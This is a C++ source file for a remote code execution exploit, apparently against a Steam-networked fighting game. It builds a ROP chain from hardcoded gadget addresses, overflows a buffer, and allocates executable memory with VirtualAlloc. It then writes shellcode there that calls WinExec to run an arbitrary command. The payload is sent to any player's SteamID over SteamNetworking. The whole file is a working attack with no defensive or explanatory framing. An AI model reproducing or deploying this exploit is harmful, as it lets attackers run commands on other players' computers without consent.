#include "Include.h"

const std::uint8_t executeCmdShellcode[] = { 0xA1, 0x24, 0xF0, 0xCF, 0x00, 0x50, 0x68, 0x2C, 0xF0, 0xCF, 0x00, 0x68, 0x18, 0xF0, 0xCF, 0x00, 0x68, 0x04, 0xF0, 0xCF, 0x00, 0x8B, 0x0D, 0xC0, 0x41, 0xA3, 0x00, 0xFF, 0xD1, 0x50, 0x8B, 0x15, 0xEC, 0x40, 0xA3, 0x00, 0xFF, 0xD2, 0xFF, 0xD0, 0xC3 };

/*
mov    eax,ds:0xCFF024				// showCmd
push   eax
push   0xCFF02C						// cmd
push   0xCFF018						// "WinExec"
push   0xCFF004						// "Kernel32.dll"
mov    ecx,DWORD PTR ds:0xA341C0	// GetModuleHandleA from imports
call   ecx							// hKernel32 = GetModuleHandleA("Kernel32.dll");
push   eax							// Push hKernel32
mov    edx,DWORD PTR ds:0xA340EC	// GetProcAddress from imports
call   edx							// pWinExec = GetProcAddress(hKernel32, "WinExec");
call   eax							// pWinExec(cmd, showCmd)
ret
*/

std::uintptr_t pStorage = 0xCFF000;
std::uintptr_t ppGetModuleHandleA = 0xA341C0;
std::uintptr_t ppVirtualAlloc = 0xA34210;

// Gadgets
std::uintptr_t pNop = 0x40AB51;
std::uintptr_t pPop_Esp = 0x40BD21;
std::uintptr_t pPop_Eax = 0x65FD04;
std::uintptr_t pMov_Eax_dEax = 0x42F233;
std::uintptr_t pCall_Eax = 0x955A63;
std::uintptr_t pPop_Ecx = 0x40107A;
std::uintptr_t pMov_dEax_Ecx = 0x939FC1;
std::uintptr_t pAdd_Eax_4 = 0x44D0C3;
std::uintptr_t pXchg_Ecx_Eax = 0x7E1FEC;

PayloadContext::PayloadContext()
{
	payload = std::vector<std::uintptr_t>(0x412, pNop); // This will overflow a bunch on the target so we hit the return address for our ROP chain.
	storageWritePtr = pStorage;
	payloadWritePtr = 0x200;
}

// Call function from memory in remote process.
std::uintptr_t PayloadContext::Rop_CallFunction(std::uintptr_t address, const std::vector<std::uintptr_t>& params, bool storeReturn, unsigned int dereferenceCount)
{
	std::uintptr_t result = 0; // Address of stored return value.

	Push(pPop_Eax);
	Push(address);

	for (unsigned int i = 0; i < dereferenceCount; i++)
		Push(pMov_Eax_dEax);

	Push(pCall_Eax);

	for (const auto& param : params)
		Push(param);

	if (storeReturn)
	{
		result = storageWritePtr;
		Push(pPop_Ecx);
		Push(storageWritePtr);
		Push(pXchg_Ecx_Eax);
		Push(pMov_dEax_Ecx);
		storageWritePtr += sizeof(std::uintptr_t);
	}

	return result;
}

// Store data in remote process, add some padding.
void PayloadContext::Rop_WriteToAddress(std::uintptr_t address, const void* buffer, size_t& size, unsigned int dereferenceCount)
{
	size += sizeof(std::uintptr_t);
	std::vector<std::uint8_t> bufferPadded(size, 0);
	memcpy_s(bufferPadded.data(), bufferPadded.size(), buffer, size);

	Push(pPop_Eax);
	Push(address);
	for (unsigned int i = 0; i < dereferenceCount; i++)
		Push(pMov_Eax_dEax);

	size_t i = 0;
	for (i; i < size; i += sizeof(std::uintptr_t))
	{
		Push(pPop_Ecx);
		Push(((std::uintptr_t*)bufferPadded.data())[i / sizeof(std::uintptr_t)]);
		Push(pMov_dEax_Ecx);
		Push(pAdd_Eax_4);
	}

	size = i;
}

std::uintptr_t PayloadContext::Rop_AppendToStorage(const void* buffer, size_t size)
{
	Rop_WriteToAddress(storageWritePtr, buffer, size);
	auto result = storageWritePtr;
	storageWritePtr += size;
	return result;
}

// Allocate executable memory in remote process, store our shellcode there, jump to the allocated shellcode.
void PayloadContext::Rop_AllocateAndExecuteShellcode(const void* shellcode, size_t size, const std::vector<std::string>& storage)
{
	// Stack pivot to make some space
	Push(pPop_Esp, true);
	Push(0x19F0FC, true);

	//Allocate executable memory.
	auto ppPayloadLocation = Rop_CallFunction(ppVirtualAlloc, std::vector<std::uintptr_t>{NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE}, true, 1);
	Rop_WriteToAddress(ppPayloadLocation, shellcode, size, 1);

	// Store data used by shellcode.
	for (const auto& entry : storage)
		auto remote = Rop_AppendToStorage((void*)entry.data(), entry.size() + 1);

	// Run shellcode.
	Rop_CallFunction(ppPayloadLocation, std::vector<std::uintptr_t>{}, false, 1);
}

void PayloadContext::Push(std::uintptr_t value, bool append)
{
	if (!append && payloadWritePtr < payload.size())
	{
		payload[payloadWritePtr] = value;
		payloadWritePtr++;
	}

	else
		payload.push_back(value);
}

// Get a sendable buffer.
std::vector<std::uint8_t> PayloadContext::Serialize()
{
	auto packet = std::vector<std::uint8_t>(payload.size() * sizeof(std::uintptr_t));
	memcpy_s(packet.data(), packet.size(), payload.data(), payload.size() * sizeof(std::uintptr_t));
	return packet;
}

// Setup & send exploit payload with a call to WinExec to run system commands remotely.
void RCE::ExecuteCmdOnSteamID(const CSteamID& steamID, const std::string& cmd, int showCmd)
{
	PayloadContext context;
	auto shellcode = std::vector<std::uint8_t>(sizeof(executeCmdShellcode));
	memcpy_s(shellcode.data(), shellcode.size(), executeCmdShellcode, sizeof(executeCmdShellcode));
	auto storage = std::vector<std::string>{ "Kernel32.dll", "WinExec", std::string(1, (char)showCmd), cmd };
	context.Rop_AllocateAndExecuteShellcode(shellcode.data(), shellcode.size(), storage);
	SendToSteamID(steamID, context.Serialize(), 3); // Port 3 to reach vulnerable code.
}

// Send message over SteamNetworking API to target peer.
void RCE::SendToSteamID(const CSteamID& steamID, const std::vector<std::uint8_t>& packet, int port)
{
	if (steamID.IsValid())
	{
		BBTAG::SteamInterfaces interfaces{};
		if (BBTAG::GetSteamInterfaces(&interfaces) && interfaces.steamNetworking005)
			interfaces.steamNetworking005->SendP2PPacket(steamID, packet.data(), packet.size(), EP2PSend::k_EP2PSendReliable, port);
	}
}